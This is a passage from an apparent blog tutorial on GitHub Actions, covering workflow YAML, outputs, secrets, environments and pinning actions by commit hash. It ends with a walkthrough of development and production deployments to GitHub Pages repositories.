    &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;cron&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;0&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;0&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;*&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;*&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;*'&lt;/span&gt;  
&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;hello-world&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;run&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;echo Hello World!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;em&gt;(I’ll not cover the YAML format in this article but I’ll tell you that the dashes represent items in an array and if there are no dashes you are dealing with object keys. If there are dashes followed by… no dashes… it’s an array of objects. In contrast to plain JSON it supports single quotes and comments. Everything that is not quoted is considered a string, unless it’s obviously not a string.&lt;/em&gt; &lt;a href="http://yaml.org/spec/1.2/spec.html#id2759572"&gt;&lt;em&gt;YAML is a superset of JSON.&lt;/em&gt;&lt;/a&gt; &lt;em&gt;Wait… Did I just… anyway…)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Once a day at 0:00 o’clock this workflow runs and prints “Hello World!” to some virtual Ubuntu machine’s &lt;em&gt;stdout&lt;/em&gt;, somewhere in GitHub’s networks. It does not use any action but instead runs an &lt;em&gt;echo&lt;/em&gt; command. A single step can either &lt;em&gt;run&lt;/em&gt; commands OR &lt;em&gt;use&lt;/em&gt; an action.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;hello-world&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;hello-world/say-action@v1&lt;/span&gt;  
        &lt;span class="na"&gt;with&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
          &lt;span class="na"&gt;say&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Hello World!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You set the inputs of an action, if it has any, by using the &lt;em&gt;with&lt;/em&gt; keyword. I’d have called it &lt;em&gt;inputs&lt;/em&gt; but who cares.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#outputs-and-dependent-jobs"&gt;
  &lt;/a&gt;
  Outputs and Dependent Jobs
&lt;/h4&gt;

&lt;p&gt;If an action has outputs, you can use them in consecutive steps of the same job. The step with the outputs just needs an &lt;em&gt;id&lt;/em&gt; to be referenced by other steps.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;hello-world&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;get-name&lt;/span&gt;  
        &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;hello-world/get-name-action@v1&lt;/span&gt; &lt;span class="c1"&gt;# has a "name" output  &lt;/span&gt;
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;hello-world/greet-action@v1&lt;/span&gt;          
        &lt;span class="na"&gt;with&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
          &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ steps.get-name.outputs.name }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To make a job dependent on a previous one and thus allow it to use its outputs, you must specify which outputs exactly to make available and then you define an array of &lt;em&gt;“needs”&lt;/em&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;get-name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;outputs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ steps.get-name.outputs.name }}&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;get-name&lt;/span&gt;  
        &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;hello-world/get-name-action@v1&lt;/span&gt; &lt;span class="c1"&gt;# has a "name" output&lt;/span&gt;

  &lt;span class="na"&gt;say-name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;hello-world/greet-action@v1&lt;/span&gt;          
        &lt;span class="na"&gt;with&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
          &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ steps.get-name.outputs.name }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#secrets-amp-environments"&gt;
  &lt;/a&gt;
  Secrets &amp;amp; Environments
&lt;/h4&gt;

&lt;p&gt;Sometimes you need to use credentials, like an API key and you don’t want to expose such values in your workflow file directly. In your repository’s settings you’ll find a section called “Secrets”.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--aO-SKDp5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2Ad9eZlMqTucjIdpCX3YmmVA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--aO-SKDp5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2Ad9eZlMqTucjIdpCX3YmmVA.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here you can define those values and you can use them in your workflows like this.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;run&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;echo ${{ secrets.SECRET_STRING }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Secrets can also be defined for an entire organization on GitHub (go to its settings and there “Secrets”), to be available in all workflows across all repositories of that organization. On the other hand, you can also further restrict access to secrets. That’s what &lt;a href="https://docs.github.com/en/actions/reference/environments"&gt;environments&lt;/a&gt; are for. Think of them as “categories” of secrets in a certain repository.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s---8IGShO2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AF3YUv1fb3_PqmH9TDTCVPg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s---8IGShO2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AF3YUv1fb3_PqmH9TDTCVPg.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can &lt;a href="https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions#jobsjob_idenvironment"&gt;tell a workflow job what environment’s secrets it can access&lt;/a&gt;. Let’s say you’ve created an environment in your repository’s settings called &lt;em&gt;development.&lt;/em&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;hello-world&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;environment&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;development&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;run&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;echo ${{ secrets.DEVELOPMENT_ENV_SECRET }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the environment settings you’ll see that access can also be restricted to certain branches, so that only a workflow that was triggered by an event related to a matching branch has access to the environment’s secrets and you can also require an admin to approve those workflow runs before they actually run.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ft-l5UE_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AAnVvdJJW9wW8aJFFtpg6BA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ft-l5UE_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AAnVvdJJW9wW8aJFFtpg6BA.png" alt=""&gt;&lt;/a&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qcBg2dbI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2ARr1KzpVoi3PhippSgRvpRQ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qcBg2dbI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2ARr1KzpVoi3PhippSgRvpRQ.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We’ll use that later in the article.&lt;/p&gt;

&lt;p&gt;After digesting this very condensed information you should have a feeling for how powerful and flexible these workflows can be and that you can basically do anything you can imagine. For example, I am using them to integrate cryptocurrency payments into deployment pipelines on GitHub but that’s a top secret project and you better erase that information from your memory right now. Ok? Good. Thanks.&lt;/p&gt;

&lt;p&gt;If you want to dive deeper into GitHub Actions on your own, browse through &lt;a href="https://docs.github.com/en/actions"&gt;the docs&lt;/a&gt; and if you want to start experimenting, I recommend adding &lt;a href="https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions"&gt;Workflow syntax for GitHub Actions&lt;/a&gt; and &lt;a href="https://docs.github.com/en/actions/reference/events-that-trigger-workflows"&gt;Events that trigger workflows&lt;/a&gt; to your bookmarks.&lt;/p&gt;
&lt;h4&gt;
  &lt;a href="#attention-a-quick-note-on-security-when-using-secrets-with-unofficialunverified-actions"&gt;
  &lt;/a&gt;
  ATTENTION: A quick note on security when using secrets with unofficial/unverified actions!
&lt;/h4&gt;

&lt;p&gt;As mentioned, actions can take inputs. Those inputs can be secrets. A common example is Docker:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;build-and-push-docker-image&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Login to DockerHub&lt;/span&gt;  
        &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;docker/login-action@v1&lt;/span&gt;   
        &lt;span class="na"&gt;with&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
          &lt;span class="na"&gt;username&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ secrets.DOCKERHUB_USERNAME }}&lt;/span&gt;  
          &lt;span class="na"&gt;password&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ secrets.DOCKERHUB_TOKEN }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The action being used here is &lt;a href="https://github.com/marketplace/actions/docker-login"&gt;&lt;em&gt;docker/login-action&lt;/em&gt;&lt;/a&gt;&lt;em&gt;,&lt;/em&gt; which is a verified action:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--S2U1MP0B--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AZmdyb9cdwFHHuJM43YE9fQ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--S2U1MP0B--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AZmdyb9cdwFHHuJM43YE9fQ.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;What version of the action you use is specified by the &lt;code&gt;@v1&lt;/code&gt; at the end, which is a branch or tag name. Now, Docker might be a trustworthy author but even trusted organizations might have a new team member every now and then and sometimes new team members turn out to be not as trustworthy as the rest of the organization they just joined and security policies are sometimes more a theoretical thing. Anyway… At the latest when working with unverified actions you need to be aware of one thing (in case you aren’t already):&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#the-code-referenced-by-a-tag-can%C2%A0change"&gt;
  &lt;/a&gt;
  &lt;strong&gt;The code referenced by a tag can change!&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;That means: An action you pass one of your secrets to, can today be your best friend and tomorrow steal your most secret secrets, without you ever even knowing, and reveal them to your worst enemies, who are browsing the dark web looking for the latest hacks and leaks!&lt;/p&gt;

&lt;p&gt;If in any doubt, reference an action by a commit hash, like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Login to shady service&lt;/span&gt;  
  &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;trustme/spy-action@`172239021f7ba04fe7327647b213799853a9eb89`&lt;/span&gt;  
  &lt;span class="na"&gt;with&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;password&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ secrets.SUPER_SECURE_PASSWORD }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;AND&lt;/strong&gt; make sure that the code referenced by that commit hash actually does what the readme says it does. If you don’t… well… then just use the tag name. You have been warned (by &lt;a href="https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions#using-release-management-for-your-custom-actions"&gt;the docs&lt;/a&gt; too).&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#my-github-pages%C2%A0scenario"&gt;
  &lt;/a&gt;
  My GitHub Pages Scenario
&lt;/h3&gt;

&lt;p&gt;Now that you should be up to speed with GitHub Actions and Workflows and everything, I’ll finally go into my specific real-world-scenario where a few workflows manage multiple GitHub Pages instances, representing different environments for the app I was working on.&lt;/p&gt;

&lt;p&gt;I needed three environments that behave like this:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  &lt;strong&gt;Production&lt;/strong&gt;: The app that users will actually use. Updated on push to main branch, requiring admin approval.&lt;/li&gt;
&lt;li&gt;  &lt;strong&gt;Development&lt;/strong&gt;: Preview of the latest development progress. Updated on push to development branch.&lt;/li&gt;
&lt;li&gt;  &lt;strong&gt;Staging&lt;/strong&gt;: “Phoenix” deployments, created for pull requests from feature branches and deleted on close, which includes merges.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The main repository, just called “&lt;em&gt;app”&lt;/em&gt;, does not have it’s own GitHub Page. Instead there are two additional repositories, “&lt;em&gt;app-prod”&lt;/em&gt; and “&lt;em&gt;app-dev”&lt;/em&gt;. I mentioned in the beginning, that you surely don’t want to maintain any mirror repositories and that’s why these repositories only hold a build of the app and have their GitHub Page enabled. That’s their only purpose. Additionally each pull request on the development branch will result in a new repository named &lt;em&gt;“app-pr-”.&lt;/em&gt; Here’s a visualization:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dcBf8W4C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2ApWeMVfOT5Hf15njwAHHLpw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dcBf8W4C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2ApWeMVfOT5Hf15njwAHHLpw.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#workflow-development-build-and%C2%A0deploy"&gt;
  &lt;/a&gt;
  Workflow: Development Build and Deploy
&lt;/h4&gt;

&lt;p&gt;Let’s start with the development deployment, since it’s the most straight forward without any extras. Take a look at &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml"&gt;this workflow file&lt;/a&gt; and then I’ll guide you through it step by step. The gist of what happens is, we checkout the repository, build the app and push that build to the &lt;em&gt;app-dev&lt;/em&gt; repository.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1.)&lt;/strong&gt; The workflow runs when new commits are pushed to the development branch but not for changes that only affect the workflow files themselves or any markdown files:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L2-L7"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L2-L7&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2.)&lt;/strong&gt; We set the URL that is connected to the &lt;em&gt;app-dev&lt;/em&gt; repository’s GitHub Page as a global environment variable, to use it later in the workflow:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L8-L9"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L8-L9&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3.)&lt;/strong&gt; There’s actually just one job, with a lot of steps, that runs on a &lt;em&gt;ubuntu-latest&lt;/em&gt; virtual machine, using secrets we configured for our development environment in the repository settings:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L11-L16"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L11-L16&lt;/a&gt;&lt;br&gt;&lt;br&gt;
&lt;strong&gt;FYI:&lt;/strong&gt; Setting the &lt;em&gt;url&lt;/em&gt; key for the environment only means that GitHub will show a link to that URL in different places on github.com, like in a related pull request or &lt;a href="https://github.com/OpenQDev/app/deployments"&gt;the repository’s deployments overview&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4.)&lt;/strong&gt; We use &lt;a href="https://github.com/actions/setup-node"&gt;an official action&lt;/a&gt; (actions provided by the &lt;em&gt;actions&lt;/em&gt; GitHub organization) to prepare Node.js on the VM:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L18-L19"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L18-L19&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5.)&lt;/strong&gt; We use normal Git commands to set the GitHub Actions bot as the commit author, because later we will commit and push changes to a repository:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L22-L25"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L22-L25&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6.)&lt;/strong&gt; We checkout the repository to a &lt;em&gt;build&lt;/em&gt; directory, using &lt;a href="https://github.com/actions/checkout"&gt;the official checkout action&lt;/a&gt;:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L27-L30"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L27-L30&lt;/a&gt;&lt;br&gt;&lt;br&gt;
&lt;strong&gt;FYI:&lt;/strong&gt; If you don’t pass a specific repository name to the checkout action, like in step 8, it will simply checkout the repository in which the workflow lives.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;7.)&lt;/strong&gt; We move into this &lt;em&gt;build&lt;/em&gt; directory and actually build the app (a &lt;a href="https://nuxtjs.org/"&gt;Nuxt.js&lt;/a&gt; app by the way), after setting some environment variables. Then we move back to the parent directory:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L32-L41"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L32-L41&lt;/a&gt;&lt;br&gt;&lt;br&gt;
&lt;strong&gt;FYI:&lt;/strong&gt; Exported environment variables are not persistent across jobs/steps and are not to be confused with the &lt;a href="https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions#env"&gt;workflow’s env vars&lt;/a&gt; (line 9), which are available throughout the entire workflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;8.)&lt;/strong&gt; Now we checkout the &lt;em&gt;app-dev&lt;/em&gt; repository to a &lt;em&gt;deploy&lt;/em&gt; directory, this time also providing a personal access token as a secret. This allows as to push changes to that repository in the next step:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L43-L48"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L43-L48&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;9.)&lt;/strong&gt; And then we simply copy the files from the &lt;em&gt;build&lt;/em&gt; directory to the &lt;em&gt;deploy&lt;/em&gt; directory, resulting in changes in the repository that we then need to commit and push:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L50-L58"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L50-L58&lt;/a&gt;&lt;br&gt;&lt;br&gt;
&lt;strong&gt;FYI:&lt;/strong&gt; &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L54-L55"&gt;Line 54 and 55&lt;/a&gt; add files needed for the GitHub Page to work properly. We disable Jekyll as GitHub’s default static site generator (we take care of that ourselves by using Nuxt) and we configure the domain we want to be connected to our development deployment.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Done!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now isn’t that super easy and intuitive? :D I’m not claiming that this is the smartest and most efficient way of doing this. But I hope it’s comprehensible enough. Let’s move on to the production deployment.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#workflow-production-build-and%C2%A0deploy"&gt;
  &lt;/a&gt;
  Workflow: Production Build and Deploy
&lt;/h4&gt;

&lt;p&gt;Take a look at &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml"&gt;the workflow file&lt;/a&gt; and you will notice that it’s… pretty much the same. The only differences are &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml#L4"&gt;the branch this workflow “listens” to&lt;/a&gt;, &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml#L9"&gt;the deployment URL&lt;/a&gt;, &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml#L15"&gt;the environment&lt;/a&gt;, two of &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml#L37-L38"&gt;the env vars used when building the app&lt;/a&gt; and &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml#L46"&gt;the deployment repository&lt;/a&gt;. The more significant difference however, is the environment’s configuration in the repository settings. It will allow this workflow to run only after an admin approved it.&lt;/p&gt;

